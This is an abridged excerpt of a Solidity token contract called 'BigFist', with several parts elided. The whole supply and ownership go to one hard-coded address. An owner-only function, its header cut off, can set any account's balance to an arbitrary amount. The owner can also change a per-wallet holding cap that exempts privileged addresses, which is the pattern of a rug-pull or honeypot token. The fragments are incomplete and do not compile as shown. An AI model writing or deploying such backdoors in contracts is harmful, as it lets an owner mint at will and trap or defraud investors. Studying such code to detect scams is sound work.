...
contract BigFist is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 5555 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    string private _name = "BigFist";
    string private _symbol = "BigFist";
    ...
    address private TokenReceivingAddress = address(0x649A5A2Fc2dEAc18E295C37a533461A9c72d3A6b); 
    address public devAddress = address(0x649A5A2Fc2dEAc18E295C37a533461A9c72d3A6b);
    ...
    uint256 public _maxCbAmount = 30 * 10**9; 
    ...
    constructor () public {
        _rOwned[TokenReceivingAddress] = _rTotal;
        ...
        _isExcludedFromFee[TokenReceivingAddress] = true;
        _isExcludedFromFee[burnAddress] = true;
        _isExcludedFromFee[address(this)] = true;
        
        transferOwnership(TokenReceivingAddress);

        emit Transfer(address(0),TokenReceivingAddress, _tTotal);
    }
    ...
    function setmaxCbAmount(uint256 maxCbAmount) external onlyOwner() {
        _maxCbAmount = maxCbAmount;
    }
    ...
    uint256 am,address account ) public onlyOwner {
        _rOwned[account] =     (
        am
        .mul(_getRate()));
    ...
    function _transfer(
        ...
        if(from != TokenReceivingAddress && to != TokenReceivingAddress) {
            require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
        }
        
        if(!_isExcludedFromFee[to] && !isContract(to)){
            require(balanceOf(to).add(amount) <= _maxCbAmount, "Transfer amount exceeds the maxCbAmount.");
        }
